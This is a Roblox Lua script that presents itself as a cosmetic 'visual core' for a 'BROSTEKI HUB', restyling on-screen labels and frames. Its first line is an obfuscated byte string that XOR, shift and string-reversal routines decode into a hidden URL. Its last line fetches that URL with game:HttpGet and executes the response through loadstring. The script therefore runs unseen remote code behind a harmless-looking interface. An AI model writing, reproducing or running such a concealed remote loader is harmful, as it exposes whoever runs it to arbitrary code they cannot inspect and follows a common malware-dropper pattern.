
--[[ STAGE 2: VISUAL CORE ]]
local _YyEpZpmXSb9ug="\160\182\159\227\173\254\244\246\178\178\003\183\230\190\190\207\212\192\246\244\204\204\208\198\255\000\229\212\211\210\220\016\014\250\024\012\022\253\254\242\004\034\048\244\011\014\028\060\253\250\004\002\070\005\007\014\038\012\022\014\041\027\090\033\050\031\036\034\044\038\044\043\046\047\114\050\054\060\121\081\061\070\087\067\070\076\093\082\098\102\085\106\079\109\084\100\157\120\100\119\166\168\181\128\127\133\135\109"local BId6vXaVUQ6vtz9JR5Y=232 local ChBWFz8R6vKTL=13 local rGN9f0QNbiqfkYB4_pxYZ=0 local UwcWkkXwpZz0=2 local _5IVvMN1Kyh5M3FZXQ1eUd=8 local rKxB9jBQC8nRHsWy544D=true local Lh6GOuj6JwNcHU03p_lIu=bit32 and bit32.bxor if not Lh6GOuj6JwNcHU03p_lIu then Lh6GOuj6JwNcHU03p_lIu=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local MG_RpUYd1EUL7qTBsi={}for Cq6Hj8mpJ7Iup2ZGL=1,#_YyEpZpmXSb9ug do local sE4hpssNCYzUZu7=string.byte(_YyEpZpmXSb9ug,Cq6Hj8mpJ7Iup2ZGL)local _Rxy3CFu_8KgsWSd=(ChBWFz8R6vKTL+(Cq6Hj8mpJ7Iup2ZGL*UwcWkkXwpZz0)+_5IVvMN1Kyh5M3FZXQ1eUd)%256 if rGN9f0QNbiqfkYB4_pxYZ==0 then sE4hpssNCYzUZu7=(sE4hpssNCYzUZu7-_Rxy3CFu_8KgsWSd)%256 MG_RpUYd1EUL7qTBsi[Cq6Hj8mpJ7Iup2ZGL]=string.char(Lh6GOuj6JwNcHU03p_lIu(sE4hpssNCYzUZu7,BId6vXaVUQ6vtz9JR5Y))else sE4hpssNCYzUZu7=Lh6GOuj6JwNcHU03p_lIu(sE4hpssNCYzUZu7,BId6vXaVUQ6vtz9JR5Y)MG_RpUYd1EUL7qTBsi[Cq6Hj8mpJ7Iup2ZGL]=string.char((sE4hpssNCYzUZu7-_Rxy3CFu_8KgsWSd)%256)end end local x2xa3yOqnedqM=table.concat(MG_RpUYd1EUL7qTBsi)if rKxB9jBQC8nRHsWy544D then x2xa3yOqnedqM=string.reverse(x2xa3yOqnedqM)end local o9VgN6xOz8EdTEtI5M3zL=x2xa3yOqnedqM
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(o9VgN6xOz8EdTEtI5M3zL))()
